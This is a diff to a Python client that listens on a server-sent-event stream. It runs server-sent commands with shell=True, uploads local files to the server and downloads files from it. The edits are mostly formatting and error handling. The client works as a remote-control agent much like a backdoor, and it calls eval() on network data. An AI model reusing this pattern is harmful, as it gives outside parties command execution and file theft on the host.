@@ -130,14 +130,13 @@ if __name__ == "__main__":
         try:
             # server sent event client
             messages = SSEClient(sse_uri)
-            # print(messages)
             prevMsg = {}
             for msg in messages:
                 if msg.data:
                     data = eval(msg.data)
                     # print(data)
                     if (data != prevMsg) and (data['id'] == my_id):
-                        if data['type'] == 'command':
+                        if   data['type'] == 'command':
                             print(['cd', '.', '&']+data['command'].split())
                             p = Popen(['cd', '.', '&']+data['command'].split(), stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
                             output, err = p.communicate(b"input data that is passed to subprocess' stdin")
@@ -155,11 +154,11 @@ if __name__ == "__main__":
                                 file = {'myfile': fo}
                                 r = requests.post(
                                         server_uri, 
-                                        files=file, 
-                                        data={
-                                            'action':'client_upload_result_success', 
-                                            'cma_msg':'successfully downloaded', 
-                                            'client_id': data['id']
+                                        files = file, 
+                                        data = {
+                                            'action'   : 'client_upload_result_success', 
+                                            'client_id': data['id'],
+                                            'cma_msg'  : 'Successfully downloaded', 
                                         }
                                     )
                                 if r.status_code != 200:
@@ -169,7 +168,10 @@ if __name__ == "__main__":
                                 fo.close()
                             except Exception as e:
                                 print('can\'t find file')
-                                post({'action': 'client_upload_result_err', 'client_id': my_id, 'cma_msg': 'can\'t find file'})
+                                post({
+                                    'action'   : 'client_upload_result_err', 
+                                    'client_id': my_id, 
+                                    'cma_msg'  : 'can\'t find file'})
 
                         elif data['type'] == 'download':
                             try:
@@ -177,14 +179,18 @@ if __name__ == "__main__":
                                 destpath = getFolderName(data['command'])
                                 file_url = server_file+filename
                                 r = requests.get(file_url) # create HTTP response object
-                                if not os.path.exists(destpath):
-                                    os.makedirs(destpath)
-                                    print(destpath+' is created')
+                                try:
+                                    if not os.path.exists(destpath):
+                                        os.makedirs(destpath)
+                                        print(destpath+' is created')
+                                except Exception as e:
+                                    destpath = '.'
                                 with open(destpath+'\\'+filename,'wb') as f:
                                     f.write(r.content)
                                 a = post({'action': 'client_download_result', 'client_id': my_id, 'cma_msg': 'success'})
                                 print(a)
                             except Exception as e:
+                                print(e)
                                 print('Error occured while downloading')
                                 post({'action': 'client_download_result', 'client_id': my_id, 'cma_msg': 'error'})
 
